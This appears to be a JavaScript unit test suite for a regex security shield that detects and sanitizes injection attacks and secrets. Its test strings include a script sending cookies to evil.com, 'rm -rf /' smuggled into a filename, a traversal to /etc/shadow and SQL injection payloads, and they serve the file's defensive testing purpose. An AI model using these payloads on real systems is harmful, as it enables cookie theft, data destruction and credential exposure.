/**
 * Unit #305 Test Suite: Regex Pattern Shield & Sanitizer
 * Track 1 Verification Rig
 */

import assert from 'node:assert/strict';
import {
  inspectString,
  inspect,
  sanitizeString,
  sanitize,
  shieldMiddleware,
  SecurityShieldViolation,
  benchmarkShield
} from './engine.js';

console.log('⚡ [Unit #305 Test Suite] Initiating verification sequence...');

// Test 1: SQL Injection Detection
{
  const sqliPayload = "admin' UNION SELECT null, username, password FROM users--";
  const result = inspectString(sqliPayload);
  assert.equal(result.isSafe, false);
  assert.ok(result.riskScore >= 90);
  assert.equal(result.riskLevel, 'CRITICAL');
  assert.ok(result.matches.some(m => m.id === 'SQLI_UNION_SELECT'));
  console.log('  ✔ SQL Injection detection passed');
}

// Test 2: XSS Detection
{
  const xssPayload = '<img src="x" onerror="alert(\'pwned\')" />';
  const result = inspectString(xssPayload);
  assert.equal(result.isSafe, false);
  assert.ok(result.matches.some(m => m.id === 'XSS_INLINE_EVENT'));

  const scriptPayload = '<script>fetch("http://evil.com?c="+document.cookie)</script>';
  const scriptResult = inspectString(scriptPayload);
  assert.equal(scriptResult.isSafe, false);
  assert.ok(scriptResult.matches.some(m => m.id === 'XSS_SCRIPT_TAG'));
  console.log('  ✔ Cross-Site Scripting (XSS) detection passed');
}

// Test 3: Path Traversal & OS Command Injection
{
  const traversal = '../../../../etc/shadow%00';
  const result = inspectString(traversal);
  assert.equal(result.isSafe, false);
  assert.ok(result.matches.some(m => m.id === 'TRAVERSAL_DOT_DOT'));
  assert.ok(result.matches.some(m => m.id === 'NULL_BYTE_POISONING'));

  const cmdInjection = 'input.txt; rm -rf /';
  const cmdResult = inspectString(cmdInjection);
  assert.equal(cmdResult.isSafe, false);
  assert.ok(cmdResult.matches.some(m => m.id === 'SHELL_INJECTION_CHAIN'));
  console.log('  ✔ Path Traversal & Command Injection detection passed');
}

// Test 4: Secret Detection and Redaction
{
  const secretText = 'Here is my AWS key: AKIAIOSFODNN7EXAMPLE and secret!';
  const inspectRes = inspectString(secretText);
  assert.ok(inspectRes.matches.some(m => m.id === 'SECRET_AWS_KEY'));

  const sanitized = sanitizeString(secretText, { escapeHtml: false });
  assert.ok(!sanitized.includes('AKIAIOSFODNN7EXAMPLE'));
  assert.ok(sanitized.includes('[REDACTED_SECRET]'));
  console.log('  ✔ Secret detection & redaction passed');
}

// Test 5: Recursive Object Sanitization
{
  const dirtyObject = {
    user: '<b>Alice</b>',
    query: 'status=active',
    metadata: {
      note: 'Hello <script>alert(1)</script> World',
      tags: ['safe_tag', '<img onerror="run()"/>']
    }
  };

  const cleanObject = sanitize(dirtyObject);
  assert.equal(cleanObject.user, '&lt;b&gt;Alice&lt;/b&gt;');
  assert.ok(!cleanObject.metadata.note.includes('<script>'));
  assert.ok(cleanObject.metadata.note.includes('&lt;script&gt;'));
  assert.ok(cleanObject.metadata.tags[1].includes('&lt;img'));
  console.log('  ✔ Recursive Object Sanitization passed');
}

// Test 6: Shield Middleware Blocking & Passing
{
  const safeData = { title: 'Factory Update', author: 'Crew Chief' };
  const approved = shieldMiddleware(safeData);
  assert.equal(approved.title, 'Factory Update');

  const maliciousData = {
    search: "1' OR '1'='1",
    action: 'view'
  };

  assert.throws(() => {
    shieldMiddleware(maliciousData);
  }, SecurityShieldViolation);
  console.log('  ✔ shieldMiddleware passed');
}

// Test 7: Benchmark Performance
{
  const bench = benchmarkShield(1000);
  assert.ok(bench.throughputPerSec > 5000, `Throughput was ${bench.throughputPerSec} / sec`);
  console.log(`  ✔ benchmarkShield passed (${bench.throughputPerSec} checks/sec, latency: ${bench.avgLatencyUs} µs)`);
}

console.log('🏁 [Unit #305 Test Suite] ALL CHECKS 100% GREEN.\n');
